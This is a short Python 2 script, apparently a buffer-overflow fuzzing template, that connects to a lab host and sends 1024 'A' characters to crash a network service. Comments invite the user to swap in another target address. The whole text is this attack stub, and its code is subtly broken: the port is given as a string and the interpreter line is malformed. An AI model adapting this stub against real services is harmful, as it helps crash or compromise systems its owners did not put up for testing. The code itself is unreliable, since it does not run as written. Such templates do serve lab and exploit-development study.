#!/usr/bin/python python2.7.18
import socket

RHOST = "192.168.56.101"  # mind to change :-)
RPORT = "31337"           # mind to change :-)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = ""
buf += "A"*1024
buf += "\n"

s.send(buf)
